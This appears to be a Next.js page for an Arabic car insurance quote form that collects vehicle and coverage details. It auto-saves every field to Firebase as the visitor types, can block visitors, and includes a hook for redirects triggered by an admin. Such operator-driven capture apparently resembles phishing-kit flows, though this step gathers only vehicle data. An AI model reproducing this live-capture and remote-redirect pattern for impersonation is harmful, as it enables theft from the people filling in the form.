"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Globe } from 'lucide-react'
import { FullPageLoader } from "@/components/loader"
import { StepShell } from "@/components/step-shell"
import { getOrCreateVisitorID, checkIfBlocked } from "@/lib/visitor-tracking"
import { useAutoSave } from "@/hooks/use-auto-save"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
import { addData } from "@/lib/firebase"
import { translations } from "@/lib/translations"
import { getSelectedVehicle } from "@/lib/vehicle-api"

export default function InsurancePage() {
  const router = useRouter()
  const [visitorID] = useState(() => getOrCreateVisitorID())
  const [loading, setLoading] = useState(true)
  const [isBlocked, setIsBlocked] = useState(false)
  
  // Form fields
  const [insuranceCoverage, setInsuranceCoverage] = useState("")
  const [insuranceStartDate, setInsuranceStartDate] = useState("")
  const [vehicleUsage, setVehicleUsage] = useState("")
  const [vehicleValue, setVehicleValue] = useState("")
  const [vehicleYear, setVehicleYear] = useState("")
  const [vehicleModel, setVehicleModel] = useState("")
  const [repairLocation, setRepairLocation] = useState("agency")
  
  // Language
  const [language, setLanguage] = useState<"ar" | "en">("ar")
  
  // Auto-save all form data
  useAutoSave({
    visitorId: visitorID,
    pageName: "insur",
    data: {
      insuranceCoverage,
      insuranceStartDate,
      vehicleUsage,
      vehicleValue,
      vehicleYear,
      vehicleModel,
      repairLocation
    }
  })
  
  // Monitor redirect requests from admin
  useRedirectMonitor({
    visitorId: visitorID,
    currentPage: "insur"
  })
  
  // Initialize on mount
  useEffect(() => {
    const init = async () => {
      const blocked = await checkIfBlocked(visitorID)
      if (blocked) {
        setIsBlocked(true)
        setLoading(false)
        return
      }
      
      setLoading(false)
    }
    
    init()
  }, [visitorID])
  
  // Auto-fill vehicle data from car-bot
  useEffect(() => {
    const vehicleData = getSelectedVehicle()
    if (vehicleData) {
      // تعبئة سنة الصنع والموديل تلقائياً
      setVehicleYear(vehicleData.year.toString())
      setVehicleModel(`${vehicleData.maker} ${vehicleData.model}`)
      console.log('✅ Auto-filled vehicle data:', vehicleData)
    }
  }, [])
  
  // Handle vehicle value input - numbers only
  const handleVehicleValueChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, '') // Remove non-numeric characters
    setVehicleValue(value) // Allow any numeric input, validation happens on submit
  }
  
  // Handle form submit
  const handleSecondStepSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Validate vehicle value
    const valueNum = parseInt(vehicleValue)
    if (valueNum < 10000 || valueNum > 1000000) {
      alert('قيمة المركبة يجب أن تكون بين 10,000 و 1,000,000 ريال')
      return
    }
    
    await addData({
      id: visitorID,
      insuranceCoverage,
      insuranceStartDate,
      vehicleUsage,
      vehicleValue,
      vehicleYear,
      vehicleModel,
      repairLocation,
      currentStep: 3,
      currentPage: "compar",
      insurCompletedAt: new Date().toISOString()
    }).then(() => {
      // Navigate immediately
      router.push('/compar')
    })
  }
  
  if (loading) {
    return <FullPageLoader />
  }
  
  if (isBlocked) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
          <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
          <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
          <p className="text-gray-600 mt-2">للمزيد من المعلومات، يرجى التواصل مع الدعم الفني.</p>
        </div>
      </div>
    )
  }
  
  // Generate years from 2000 to 2026
  const years = Array.from({ length: 27 }, (_, i) => 2026 - i) // 2026 down to 2000
  
  return (
    <StepShell
      step={1}
      title="بيانات التأمين"
      subtitle="أكمل معلومات التأمين والمركبة للانتقال للعروض."
      maxWidthClassName="max-w-3xl"
      headerAction={
        <button 
          onClick={() => setLanguage(language === "ar" ? "en" : "ar")}
          className="flex items-center gap-2 rounded-lg border border-[#bbdefb] bg-[#e3f2fd] px-3 py-2 text-sm font-bold text-[#1976d2]"
        >
          <Globe className="h-4 w-4 text-[#1976d2]" />
          <span>{language === "ar" ? "EN" : "AR"}</span>
        </button>
      }
    >
      <form onSubmit={handleSecondStepSubmit} className="space-y-4 md:space-y-5" dir={language === "ar" ? "rtl" : "ltr"}>
        <div className="space-y-1.5">
          <label className="block text-slate-700 font-bold text-sm md:text-base">نوع التأمين</label>
          <select
            value={insuranceCoverage}
            onChange={(e) => setInsuranceCoverage(e.target.value)}
            className="w-full h-11 md:h-12 text-right text-sm md:text-base border border-slate-300 rounded-xl px-3 md:px-4 bg-white focus:border-[#1976d2] focus:ring-2 focus:ring-[#1976d2]/10 focus:outline-none transition-all appearance-none cursor-pointer text-gray-900 font-medium"
            required
          >
            <option value="">إختر</option>
            <option value="comprehensive">شامل</option>
            <option value="third-party">ضد الغير</option>
          </select>
        </div>

        <div className="space-y-1.5">
          <label className="block text-slate-700 font-bold text-sm md:text-base">تاريخ بدء التأمين</label>
          <input
            type="date"
            value={insuranceStartDate}
            onChange={(e) => setInsuranceStartDate(e.target.value)}
            className="w-full h-11 md:h-12 text-right text-sm md:text-base border border-slate-300 rounded-xl px-3 md:px-4 bg-white focus:border-[#1976d2] focus:ring-2 focus:ring-[#1976d2]/10 focus:outline-none transition-all cursor-pointer text-gray-900 font-medium"
            style={{
              colorScheme: 'light',
              direction: 'rtl'
            }}
            required
          />
        </div>

        <div className="space-y-1.5">
          <label className="block text-slate-700 font-bold text-sm md:text-base">
            الغرض من استخدام المركبة
          </label>
          <select
            value={vehicleUsage}
            onChange={(e) => setVehicleUsage(e.target.value)}
            className="w-full h-11 md:h-12 text-right text-sm md:text-base border border-slate-300 rounded-xl px-3 md:px-4 bg-white focus:border-[#1976d2] focus:ring-2 focus:ring-[#1976d2]/10 focus:outline-none transition-all appearance-none cursor-pointer text-gray-900 font-medium"
            required
          >
            <option value="">إختر</option>
            <option value="personal">شخصي</option>
            <option value="commercial">تجاري</option>
            <option value="passenger-transport">نقل ركاب</option>
            <option value="rental">تأجير</option>
            <option value="cargo-transport">نقل بضائع</option>
            <option value="freight-vehicle">مركبة شحن</option>
            <option value="oil-transport">نقل مشتقات نفطية</option>
          </select>
        </div>

        <div className="space-y-1.5">
          <label className="block text-slate-700 font-bold text-sm md:text-base">
            القيمة التقديرية للمركبة
          </label>
          <Input
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            placeholder="أدخل القيمة بين 10,000 - 1,000,000 ريال"
            value={vehicleValue}
            onChange={handleVehicleValueChange}
            className="h-11 md:h-12 text-right text-sm md:text-base border border-slate-300 rounded-xl focus:border-[#1976d2] focus:ring-2 focus:ring-[#1976d2]/10 transition-all text-gray-900 font-medium"
            dir="rtl"
            required
            min="10000"
            max="1000000"
          />
          <p className="text-xs text-slate-500 text-right">القيمة يجب أن تكون بين 10,000 و 1,000,000 ريال</p>
        </div>

        <div className="space-y-1.5">
          <label className="block text-slate-700 font-bold text-sm md:text-base">سنة صنع المركبة</label>
          <select
            value={vehicleYear}
            onChange={(e) => setVehicleYear(e.target.value)}
            className="w-full h-11 md:h-12 text-right text-sm md:text-base border border-slate-300 rounded-xl px-3 md:px-4 bg-white focus:border-[#1976d2] focus:ring-2 focus:ring-[#1976d2]/10 focus:outline-none transition-all appearance-none cursor-pointer text-gray-900 font-medium"
            required
          >
            <option value="">إختر</option>
            {years.map((year) => (
              <option key={year} value={year}>
                {year}
              </option>
            ))}
          </select>
        </div>

        <div className="space-y-1.5">
          <label className="block text-slate-700 font-bold text-sm md:text-base">ماركة وموديل السيارة</label>
          <Input
            placeholder="مثال: تويوتا كامري 2023"
            value={vehicleModel}
            onChange={(e) => setVehicleModel(e.target.value)}
            className="h-11 md:h-12 text-right text-sm md:text-base border border-slate-300 rounded-xl focus:border-[#1976d2] focus:ring-2 focus:ring-[#1976d2]/10 transition-all text-gray-900 font-medium"
            dir="rtl"
            required
          />
        </div>

        <div className="space-y-1.5">
          <label className="block text-slate-700 font-bold text-sm md:text-base">مكان اصلاح المركبة</label>
          <div className="space-y-2 md:space-y-2.5">
            {[
              { value: "agency", label: "الوكالة" },
              { value: "workshop", label: "الورشة" },
            ].map((opt) => (
              <label
                key={opt.value}
                className={`flex items-center gap-2 md:gap-3 p-3 md:p-3.5 border-2 rounded-xl cursor-pointer transition-all ${
                  repairLocation === opt.value
                    ? "border-[#1976d2] bg-[#e3f2fd]/50 shadow-sm"
                    : "border-slate-200 hover:border-slate-300 bg-white"
                }`}
              >
                <input
                  type="radio"
                  name="repairLocation"
                  value={opt.value}
                  checked={repairLocation === opt.value}
                  onChange={(e) => setRepairLocation(e.target.value)}
                  className="w-4 h-4 md:w-5 md:h-5 text-[#1976d2] focus:ring-[#1976d2]"
                />
                <span className="text-sm md:text-base font-semibold">{opt.label}</span>
              </label>
            ))}
          </div>
        </div>

        <Button
          type="submit"
          className="w-full h-12 md:h-14 bg-[#1976d2] hover:bg-[#1565c0] text-white font-bold text-base md:text-lg rounded-xl shadow-[0_4px_16px_rgba(25,118,210,0.3)] hover:shadow-[0_6px_24px_rgba(25,118,210,0.4)] transition-all"
        >
          إظهار العروض
        </Button>
      </form>
    </StepShell>
  )
}

